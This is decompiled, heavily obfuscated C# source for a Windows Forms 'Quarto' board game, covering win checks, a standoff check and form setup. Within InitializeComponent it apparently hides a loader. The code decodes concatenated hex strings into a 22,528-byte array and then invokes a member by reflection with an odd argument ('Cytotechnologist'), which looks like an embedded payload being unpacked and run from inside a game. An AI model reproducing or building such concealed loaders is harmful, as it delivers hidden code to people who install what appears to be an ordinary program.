					if (mem[num5, 0].Square == mem[num5, 1].Square)
					{
						num = 470015232;
						num16 = 470015232;
					}
					else
					{
						num = 998310455;
						num16 = 998310455;
					}
					continue;
				}
				case 48u:
				{
					int num6;
					int num7;
					if (mem[1, num5].Dark == mem[2, num5].Dark)
					{
						num6 = -585833934;
						num7 = -585833934;
					}
					else
					{
						num6 = -247419153;
						num7 = -247419153;
					}
					num = num6 ^ (int)(num2 * 1228546042);
					continue;
				}
				case 47u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -1138883771) ^ 0x37FDD611;
						continue;
					}
					goto IL_0050;
				case 46u:
				{
					int num67;
					int num68;
					if (mem[0, num5].Big == mem[1, num5].Big)
					{
						num67 = 715475902;
						num68 = 715475902;
					}
					else
					{
						num67 = 1911137925;
						num68 = 1911137925;
					}
					num = num67 ^ ((int)num2 * -371625325);
					continue;
				}
				case 45u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -13037205) ^ 0x10370B5F;
						continue;
					}
					goto IL_005c;
				case 44u:
					if (mem[2, 1] != null)
					{
						num = ((int)num2 * -96641363) ^ 0x6F97B10A;
						continue;
					}
					goto IL_0050;
				case 43u:
				{
					int num62;
					if (mem[0, 0].Point != mem[1, 1].Point)
					{
						num = 493041491;
						num62 = 493041491;
					}
					else
					{
						num = 286811104;
						num62 = 286811104;
					}
					continue;
				}
				case 42u:
					if (mem[0, num5].Square == mem[1, num5].Square)
					{
						num = 1289339233;
						continue;
					}
					goto IL_05d2;
				case 41u:
				{
					int num52;
					if (mem[num5, 0].Dark != mem[num5, 1].Dark)
					{
						num = 2092057794;
						num52 = 2092057794;
					}
					else
					{
						num = 568128772;
						num52 = 568128772;
					}
					continue;
				}
				case 40u:
					if (mem[2, num5].Point != mem[3, num5].Point)
					{
						num = ((int)num2 * -312924003) ^ 0x4AFFED6E;
						continue;
					}
					goto IL_0337;
				case 39u:
					result = flag;
					num = 250192360;
					continue;
				case 38u:
					num11 = ((mem[2, num5].Square == mem[3, num5].Square) ? 1 : 0);
					goto IL_002e;
				case 37u:
				{
					int num42;
					int num43;
					if (mem[num5, 1].Point != mem[num5, 2].Point)
					{
						num42 = -1985743005;
						num43 = -1985743005;
					}
					else
					{
						num42 = -1132658152;
						num43 = -1132658152;
					}
					num = num42 ^ (int)(num2 * 827159441);
					continue;
				}
				case 36u:
				{
					int num40;
					int num41;
					if (mem[1, num5].Big == mem[2, num5].Big)
					{
						num40 = 2061893982;
						num41 = 2061893982;
					}
					else
					{
						num40 = 2129731479;
						num41 = 2129731479;
					}
					num = num40 ^ (int)(num2 * 113357937);
					continue;
				}
				case 35u:
				{
					int num29;
					int num30;
					if (mem[0, 0] != null)
					{
						num29 = -1602791276;
						num30 = -1602791276;
					}
					else
					{
						num29 = -1652170524;
						num30 = -1652170524;
					}
					num = num29 ^ (int)(num2 * 19045103);
					continue;
				}
				case 34u:
				{
					int num25;
					if (num5 < 4)
					{
						num = 625121219;
						num25 = 625121219;
					}
					else
					{
						num = 459468207;
						num25 = 459468207;
					}
					continue;
				}
				case 33u:
					flag = false;
					num = (int)((num2 * 1557048441) ^ 0x471588FC);
					continue;
				case 32u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = ((int)num2 * -1226260222) ^ -1422765193;
						continue;
					}
					goto IL_005c;
				case 31u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = ((int)num2 * -460600766) ^ 0x6B582D43;
						continue;
					}
					goto IL_005c;
				case 30u:
					if (mem[2, num5].Dark != mem[3, num5].Dark)
					{
						num = (int)((num2 * 661000312) ^ 0x625B8527);
						continue;
					}
					goto IL_0337;
				case 29u:
					if (mem[num5, 2].Square != mem[num5, 3].Square)
					{
						num = (int)(num2 * 2087272705) ^ -1632579866;
						continue;
					}
					goto IL_013c;
				case 28u:
				{
					int num17;
					int num18;
					if (mem[num5, 2] != null)
					{
						num17 = 1670223466;
						num18 = 1670223466;
					}
					else
					{
						num17 = 161642815;
						num18 = 161642815;
					}
					num = num17 ^ (int)(num2 * 472086947);
					continue;
				}
				case 27u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -1943594670) ^ 0x4B40539D;
						continue;
					}
					goto IL_005c;
				case 26u:
				{
					int num8;
					int num9;
					if (mem[num5, 3] != null)
					{
						num8 = 1267527350;
						num9 = 1267527350;
					}
					else
					{
						num8 = 1492065069;
						num9 = 1492065069;
					}
					num = num8 ^ (int)(num2 * 388476427);
					continue;
				}
				case 25u:
				{
					int num69;
					int num70;
					if (mem[1, 1] == null)
					{
						num69 = 1516685763;
						num70 = 1516685763;
					}
					else
					{
						num69 = 2097788835;
						num70 = 2097788835;
					}
					num = num69 ^ ((int)num2 * -839351358);
					continue;
				}
				case 24u:
					num5++;
					num = ((int)num2 * -1577156559) ^ -428613562;
					continue;
				case 23u:
				{
					int num65;
					if (mem[0, num5].Dark == mem[1, num5].Dark)
					{
						num = 837694864;
						num65 = 837694864;
					}
					else
					{
						num = 675860983;
						num65 = 675860983;
					}
					continue;
				}
				case 22u:
				{
					int num63;
					int num64;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num63 = 852059307;
						num64 = 852059307;
					}
					else
					{
						num63 = 2038119066;
						num64 = 2038119066;
					}
					num = num63 ^ ((int)num2 * -1235534819);
					continue;
				}
				case 21u:
					num5 = 0;
					num = (int)((num2 * 1644757495) ^ 0x62A2037D);
					continue;
				case 20u:
				{
					int num59;
					int num60;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
						num59 = 977504719;
						num60 = 977504719;
					}
					else
					{
						num59 = 1690091289;
						num60 = 1690091289;
					}
					num = num59 ^ (int)(num2 * 989951534);
					continue;
				}
				case 19u:
				{
					int num57;
					int num58;
					if (mem[1, 2].Point != mem[2, 1].Point)
					{
						num57 = 1273620295;
						num58 = 1273620295;
					}
					else
					{
						num57 = 1457748827;
						num58 = 1457748827;
					}
					num = num57 ^ (int)(num2 * 23555281);
					continue;
				}
				case 18u:
					if (mem[3, num5] != null)
					{
						num = (int)((num2 * 1423982030) ^ 0x3C225C12);
						continue;
					}
					goto IL_002d;
				case 17u:
				{
					int num50;
					int num51;
					if (mem[2, 2] == null)
					{
						num50 = -1749904343;
						num51 = -1749904343;
					}
					else
					{
						num50 = -985483748;
						num51 = -985483748;
					}
					num = num50 ^ (int)(num2 * 203602496);
					continue;
				}
				case 16u:
				{
					int num48;
					int num49;
					if (mem[num5, 1].Dark == mem[num5, 2].Dark)
					{
						num48 = 1323198728;
						num49 = 1323198728;
					}
					else
					{
						num48 = 299759666;
						num49 = 299759666;
					}
					num = num48 ^ ((int)num2 * -412725514);
					continue;
				}
				case 15u:
				{
					int num44;
					int num45;
					if (mem[num5, 1] == null)
					{
						num44 = 187349222;
						num45 = 187349222;
					}
					else
					{
						num44 = 1122108261;
						num45 = 1122108261;
					}
					num = num44 ^ ((int)num2 * -1463054981);
					continue;
				}
				case 14u:
					if (mem[3, 0] != null)
					{
						num = ((int)num2 * -1556473773) ^ 0x460E39D0;
						continue;
					}
					goto IL_0050;
				case 13u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = (int)(num2 * 1527360602) ^ -1644657395;
						continue;
					}
					goto IL_005c;
				case 12u:
				{
					int num34;
					int num35;
					if (mem[num5, 1].Square == mem[num5, 2].Square)
					{
						num34 = 1814465433;
						num35 = 1814465433;
					}
					else
					{
						num34 = 706663059;
						num35 = 706663059;
					}
					num = num34 ^ (int)(num2 * 1200310187);
					continue;
				}
				case 11u:
				{
					int num33;
					if (mem[0, 0].Square != mem[1, 1].Square)
					{
						num = 36458345;
						num33 = 36458345;
					}
					else
					{
						num = 329269589;
						num33 = 329269589;
					}
					continue;
				}
				case 10u:
				{
					int num27;
					int num28;
					if (mem[0, 0].Big != mem[1, 1].Big)
					{
						num27 = 519238122;
						num28 = 519238122;
					}
					else
					{
						num27 = 2112969444;
						num28 = 2112969444;
					}
					num = num27 ^ ((int)num2 * -741579373);
					continue;
				}
				case 9u:
					if (mem[1, 2] != null)
					{
						num = ((int)num2 * -1052133154) ^ -1486932274;
						continue;
					}
					goto IL_0050;
				case 8u:
				{
					int num23;
					int num24;
					if (mem[num5, 0].Big == mem[num5, 1].Big)
					{
						num23 = -2049134434;
						num24 = -2049134434;
					}
					else
					{
						num23 = -1882918919;
						num24 = -1882918919;
					}
					num = num23 ^ (int)(num2 * 83407772);
					continue;
				}
				case 7u:
				{
					int num21;
					int num22;
					if (mem[1, 1].Dark != mem[2, 2].Dark)
					{
						num21 = -1607519654;
						num22 = -1607519654;
					}
					else
					{
						num21 = -1244130375;
						num22 = -1244130375;
					}
					num = num21 ^ ((int)num2 * -1282059777);
					continue;
				}
				case 6u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = (int)(num2 * 167312480) ^ -1530684503;
						continue;
					}
					goto IL_005c;
				case 5u:
				{
					int num20;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = 547500720;
						num20 = 547500720;
					}
					else
					{
						num = 2125318315;
						num20 = 2125318315;
					}
					continue;
				}
				case 4u:
				{
					int num19;
					if (mem[0, 0].Dark != mem[1, 1].Dark)
					{
						num = 114730791;
						num19 = 114730791;
					}
					else
					{
						num = 1583251567;
						num19 = 1583251567;
					}
					continue;
				}
				case 3u:
				{
					int num12;
					int num13;
					if (mem[1, num5].Point == mem[2, num5].Point)
					{
						num12 = 287660228;
						num13 = 287660228;
					}
					else
					{
						num12 = 1475453894;
						num13 = 1475453894;
					}
					num = num12 ^ ((int)num2 * -1779901736);
					continue;
				}
				case 2u:
				{
					int num10;
					if (mem[num5, 0].Point == mem[num5, 1].Point)
					{
						num = 731863057;
						num10 = 731863057;
					}
					else
					{
						num = 2060097838;
						num10 = 2060097838;
					}
					continue;
				}
				case 1u:
					if (mem[1, num5].Square == mem[2, num5].Square)
					{
						num = ((int)num2 * -196977521) ^ -387070007;
						continue;
					}
					goto IL_05d2;
				case 0u:
				{
					int num3;
					int num4;
					if (mem[3, 3] == null)
					{
						num3 = 1130143609;
						num4 = 1130143609;
					}
					else
					{
						num3 = 1357783890;
						num4 = 1357783890;
					}
					num = num3 ^ (int)(num2 * 406690387);
					continue;
				}
				case 49u:
					break;
				default:
					{
						return result;
					}
					IL_013c:
					num11 = 1;
					goto IL_002e;
					IL_005c:
					num = 526155808;
					num26 = 526155808;
					continue;
					IL_002e:
					flag2 = (byte)num11 != 0;
					num = 234389673;
					continue;
					IL_0050:
					num = 1783492051;
					num26 = 1783492051;
					continue;
					IL_05d2:
					num11 = 0;
					goto IL_002e;
					IL_0337:
					num11 = 1;
					goto IL_002e;
					IL_002d:
					num11 = 0;
					goto IL_002e;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = true;
		int num = 0;
		bool flag3 = default(bool);
		int num6 = default(int);
		bool flag2 = default(bool);
		bool flag4 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num2 = -1149373326;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0x90391200u) % 16u)
				{
				case 14u:
					flag3 = mem[num, num6] == null;
					num2 = -2143106408;
					continue;
				case 13u:
					num++;
					num2 = ((int)num3 * -1425616212) ^ -1065115456;
					continue;
				case 12u:
					flag2 = num < 4;
					num2 = -1982951888;
					continue;
				case 11u:
					num2 = (int)((num3 * 1090884016) ^ 0x39A5FF6);
					continue;
				case 10u:
					num2 = (int)(num3 * 576069883) ^ -1854761027;
					continue;
				case 9u:
					flag = false;
					num2 = ((int)num3 * -626396550) ^ 0x7A36190B;
					continue;
				case 8u:
				{
					int num9;
					int num10;
					if (!flag3)
					{
						num9 = -1848335487;
						num10 = -1848335487;
					}
					else
					{
						num9 = -1740722743;
						num10 = -1740722743;
					}
					num2 = num9 ^ (int)(num3 * 1619244360);
					continue;
				}
				case 7u:
					num6 = 0;
					num2 = -947853606;
					continue;
				case 5u:
				{
					int num7;
					int num8;
					if (!flag4)
					{
						num7 = 1913380261;
						num8 = 1913380261;
					}
					else
					{
						num7 = 1480692070;
						num8 = 1480692070;
					}
					num2 = num7 ^ ((int)num3 * -913989640);
					continue;
				}
				case 4u:
					result = flag;
					num2 = (int)(num3 * 124258720) ^ -1426218837;
					continue;
				case 3u:
					flag4 = num6 < 4;
					num2 = -1767358667;
					continue;
				case 2u:
					num2 = ((int)num3 * -1999974474) ^ 0xC2CDC30;
					continue;
				case 1u:
					num6++;
					num2 = -430389757;
					continue;
				case 0u:
				{
					int num4;
					int num5;
					if (flag2)
					{
						num4 = -268453737;
						num5 = -268453737;
					}
					else
					{
						num4 = -1638201596;
						num5 = -1638201596;
					}
					num2 = num4 ^ (int)(num3 * 376997705);
					continue;
				}
				case 15u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		Form1.smethod_32((Control)(object)label5, "Игрок: ");
		while (true)
		{
			int num = 1814406323;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x6E160D62u) % 10u)
				{
				case 9u:
					num = (int)(num2 * 1927258919) ^ -700151281;
					continue;
				case 8u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = ((int)num2 * -302168618) ^ 0x46AB93AB;
					continue;
				case 7u:
					Form1.smethod_32((Control)(object)label6, str);
					num = ((int)num2 * -196008797) ^ 0x663D6D97;
					continue;
				case 6u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					Form1.smethod_32((Control)(object)label1, "");
					num = ((int)num2 * -799536535) ^ 0x6766766C;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)label2, "");
					num = (int)(num2 * 1108528660) ^ -1253686481;
					continue;
				case 4u:
					num = (int)(num2 * 1836655687) ^ -1004079427;
					continue;
				case 3u:
					num = (int)((num2 * 2125178830) ^ 0x452EA130);
					continue;
				case 1u:
					num = ((int)num2 * -1648443729) ^ 0x51AC7958;
					continue;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing)
		{
			goto IL_003f;
		}
		goto IL_0099;
		IL_003f:
		int num = -66994501;
		goto IL_0061;
		IL_0061:
		int num3;
		while (true)
		{
			uint num2;
			switch ((num2 = (uint)num ^ 0xEBB52276u) % 7u)
			{
			case 6u:
				num = (int)(num2 * 1441431551) ^ -616730434;
				continue;
			case 5u:
				Form1.smethod_51((IDisposable)components);
				num = ((int)num2 * -666652651) ^ -421287963;
				continue;
			case 4u:
				break;
			case 3u:
				num = (int)(num2 * 211932165) ^ -2122593395;
				continue;
			case 2u:
				((Form)this).Dispose(disposing);
				num = -888881718;
				continue;
			default:
				return;
			case 1u:
				goto IL_008e;
			case 0u:
				return;
			}
			break;
			IL_008e:
			if (components != null)
			{
				num = -738075316;
				num3 = -738075316;
				continue;
			}
			goto IL_0099;
		}
		goto IL_003f;
		IL_0099:
		num = -592767704;
		num3 = -592767704;
		goto IL_0061;
	}

	private void InitializeComponent()
	{
		//IL_0c6e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c78: Expected O, but got Unknown
		components = Form1.smethod_52();
		pictureBox1 = Form1.smethod_2();
		byte[] array = default(byte[]);
		int num3 = default(int);
		string string_ = default(string);
		object[] object_ = default(object[]);
		while (true)
		{
			int num = -565117384;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF149F38Fu) % 119u)
				{
				case 118u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = (int)(num2 * 1456573391) ^ -553049687;
					continue;
				case 117u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -118192056) ^ -1593264981;
					continue;
				case 116u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -689000016) ^ -1802929898;
					continue;
				case 115u:
					button2 = Form1.smethod_53();
					button1 = Form1.smethod_53();
					num = (int)((num2 * 1921290545) ^ 0x27E71831);
					continue;
				case 114u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = ((int)num2 * -769111410) ^ -1910686378;
					continue;
				case 113u:
					num = (int)(num2 * 1057548243) ^ -1588905594;
					continue;
				case 112u:
					num = ((int)num2 * -1770498131) ^ 0x1AE70338;
					continue;
				case 111u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = ((int)num2 * -297128497) ^ 0x1AF76C5E;
					continue;
				case 110u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = ((int)num2 * -2067593497) ^ 0x1F38AAF0;
					continue;
				case 109u:
					num = ((int)num2 * -1712799422) ^ 0x437301D2;
					continue;
				case 108u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = ((int)num2 * -1774204515) ^ -2129157752;
					continue;
				case 107u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = (int)((num2 * 1336625818) ^ 0x461B3E5);
					continue;
				case 106u:
					Form1.smethod_59((Control)(object)this);
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -2001126501) ^ 0x24E4A2D7;
					continue;
				case 105u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = ((int)num2 * -1312408215) ^ 0x3E2C5AFD;
					continue;
				case 104u:
					panel1 = Form1.smethod_55();
					timer1 = Form1.smethod_56(components);
					num = (int)(num2 * 34868141) ^ -355087360;
					continue;
				case 103u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = (int)(num2 * 453369821) ^ -284189817;
					continue;
				case 102u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = (int)(num2 * 1481234414) ^ -130711023;
					continue;
				case 101u:
					string_ = Form1.smethod_34(string_, Veet.Zr);
					num = ((int)num2 * -647052256) ^ 0x574268E8;
					continue;
				case 100u:
					num = (int)((num2 * 944561605) ^ 0x21F0B375);
					continue;
				case 99u:
					label6 = Form1.smethod_57();
					num = ((int)num2 * -1286504649) ^ -1661069813;
					continue;
				case 98u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = (int)(num2 * 2000306919) ^ -1774034696;
					continue;
				case 97u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					Form1.smethod_61((Control)(object)button1, "button1");
					num = (int)(num2 * 1656434622) ^ -891552076;
					continue;
				case 96u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = ((int)num2 * -764594336) ^ -1771467513;
					continue;
				case 94u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = (int)(num2 * 1096115437) ^ -301513661;
					continue;
				case 93u:
					num = (int)(num2 * 1263053779) ^ -1574289799;
					continue;
				case 92u:
					num = (int)((num2 * 1323246881) ^ 0x704A9BB8);
					continue;
				case 91u:
					num3++;
					num = ((int)num2 * -854875892) ^ -1059177368;
					continue;
				case 90u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = ((int)num2 * -1805855462) ^ 0x52CB9833;
					continue;
				case 89u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = (int)((num2 * 1931388901) ^ 0x40D5AFD4);
					continue;
				case 88u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)((num2 * 1237932385) ^ 0x54486A73);
					continue;
				case 87u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -277692146) ^ -35562910;
					continue;
				case 86u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = ((int)num2 * -618828586) ^ 0x10658804;
					continue;
				case 85u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = (int)((num2 * 349132485) ^ 0x3D9E02CE);
					continue;
				case 84u:
					num = (int)((num2 * 1003651985) ^ 0x70FE3C8F);
					continue;
				case 83u:
					num = ((int)num2 * -1966304086) ^ 0xED4505A;
					continue;
				case 82u:
					Form1.smethod_70(ComMember, object_);
					num = ((int)num2 * -1295120870) ^ 0x516F1529;
					continue;
				case 81u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = (int)((num2 * 1719624520) ^ 0x15D70185);
					continue;
				case 80u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -75653351) ^ 0x1D695B92;
					continue;
				case 79u:
					num = (int)(num2 * 1397795673) ^ -505534164;
					continue;
				case 78u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = ((int)num2 * -692165622) ^ -905155251;
					continue;
				case 77u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = ((int)num2 * -1950258213) ^ 0x55E7284E;
					continue;
				case 76u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = (int)((num2 * 1453967211) ^ 0x7288B6F2);
					continue;
				case 75u:
					Form1.smethod_61((Control)(object)button2, "button2");
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -227241875) ^ 0x2EDF5026;
					continue;
				case 74u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = ((int)num2 * -1253586319) ^ 0x66A327AE;
					continue;
				case 73u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = (int)((num2 * 1965530482) ^ 0x1E19690D);
					continue;
				case 72u:
					num = (int)((num2 * 655742398) ^ 0x67577944);
					continue;
				case 71u:
					CharArray(array, string.Empty);
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -786498128) ^ -2016461278;
					continue;
				case 70u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = ((int)num2 * -1316035581) ^ 0x676BC5B1;
					continue;
				case 69u:
					num = ((int)num2 * -1416319104) ^ -1512293421;
					continue;
				case 68u:
					num = ((int)num2 * -1700074695) ^ 0xB026EC4;
					continue;
				case 67u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = ((int)num2 * -1393211468) ^ 0x63A4F9B;
					continue;
				case 66u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = (int)((num2 * 1683421964) ^ 0x28B6B25E);
					continue;
				case 65u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = ((int)num2 * -1203604600) ^ -161172732;
					continue;
				case 64u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = ((int)num2 * -1227622388) ^ -964251548;
					continue;
				case 63u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = ((int)num2 * -2064273493) ^ -489409183;
					continue;
				case 62u:
					num = (int)((num2 * 1563509093) ^ 0xA6C296);
					continue;
				case 61u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = ((int)num2 * -1698533350) ^ 0x2107A863;
					continue;
				case 60u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 294925083) ^ -2101334962;
					continue;
				case 59u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = ((int)num2 * -1622850321) ^ -273319476;
					continue;
				case 58u:
					Form1.smethod_72(timer1, 1000);
					num = (int)(num2 * 1181513005) ^ -1389611043;
					continue;
				case 57u:
					string_ = Veet.Sa;
					num = (int)((num2 * 960987708) ^ 0x73987CBD);
					continue;
				case 56u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = (int)((num2 * 449342402) ^ 0x6A237E92);
					continue;
				case 55u:
					num3 = 0;
					num = ((int)num2 * -200024011) ^ 0x4F8B31E9;
					continue;
				case 54u:
					num = (int)(num2 * 186218679) ^ -2122166063;
					continue;
				case 53u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = ((int)num2 * -1228632106) ^ -115123524;
					continue;
				case 52u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)((num2 * 1349157081) ^ 0x766C9198);
					continue;
				case 51u:
					num = (int)(num2 * 1164184488) ^ -1432326599;
					continue;
				case 50u:
					richTextBox1 = Form1.smethod_54();
					num = (int)((num2 * 1153441635) ^ 0x29D40473);
					continue;
				case 49u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = ((int)num2 * -328308087) ^ -185815281;
					continue;
				case 48u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1462166202) ^ -170766324;
					continue;
				case 47u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = (int)((num2 * 542048904) ^ 0x1EE6603D);
					continue;
				case 46u:
					label1 = Form1.smethod_57();
					num = ((int)num2 * -134184534) ^ -1547308162;
					continue;
				case 45u:
					num = (int)(num2 * 608679658) ^ -1019238611;
					continue;
				case 44u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)((num2 * 319551627) ^ 0x6F5186D7);
					continue;
				case 43u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)((num2 * 111332643) ^ 0x6C0ED0B4);
					continue;
				case 42u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = ((int)num2 * -892157327) ^ 0x5DF15369;
					continue;
				case 41u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = (int)((num2 * 942404620) ^ 0x76A2966F);
					continue;
				case 40u:
					num = ((int)num2 * -645299584) ^ 0x7C105363;
					continue;
				case 39u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = ((int)num2 * -1750909572) ^ 0x1D1954AE;
					continue;
				case 38u:
				{
					int num4;
					if (num3 >= 22528)
					{
						num = -1615458971;
						num4 = -1615458971;
					}
					else
					{
						num = -627587415;
						num4 = -627587415;
					}
					continue;
				}
				case 37u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)((num2 * 309785398) ^ 0x53B6C92F);
					continue;
				case 36u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = (int)((num2 * 661160989) ^ 0x6060AD14);
					continue;
				case 35u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)(num2 * 1047672361) ^ -911013081;
					continue;
				case 34u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					num = (int)(num2 * 1064312610) ^ -586203904;
					continue;
				case 33u:
					num = (int)((num2 * 336209444) ^ 0x109CD700);
					continue;
				case 32u:
					num = ((int)num2 * -1299344392) ^ 0x2A0EB87D;
					continue;
				case 31u:
					Form1.smethod_92((Control)(object)this);
					num = (int)(num2 * 510971295) ^ -1833058312;
					continue;
				case 30u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = ((int)num2 * -1475557104) ^ -695801981;
					continue;
				case 29u:
					num = (int)(num2 * 2143052872) ^ -1303758958;
					continue;
				case 28u:
					array = new byte[22528];
					num = ((int)num2 * -2056459816) ^ -851370190;
					continue;
				case 27u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = (int)((num2 * 908932053) ^ 0x4B7DF941);
					continue;
				case 26u:
					num = ((int)num2 * -803931366) ^ 0x1089425C;
					continue;
				case 25u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = ((int)num2 * -972080638) ^ 0x7DF76B2D;
					continue;
				case 24u:
					num = ((int)num2 * -1430360064) ^ 0x7676D78F;
					continue;
				case 23u:
					num = ((int)num2 * -1942607379) ^ -400949495;
					continue;
				case 22u:
					label2 = Form1.smethod_57();
					num = (int)((num2 * 749915595) ^ 0x29BB4943);
					continue;
				case 21u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = (int)(num2 * 89644793) ^ -1539359373;
					continue;
				case 20u:
					num = (int)((num2 * 2129172834) ^ 0x3D76EFE2);
					continue;
				case 19u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = ((int)num2 * -756637546) ^ 0x3A103C5;
					continue;
				case 18u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)((num2 * 1901556975) ^ 0x35B8AD3C);
					continue;
				case 17u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = (int)(num2 * 228096910) ^ -2000489444;
					continue;
				case 16u:
					num = -299393318;
					continue;
				case 15u:
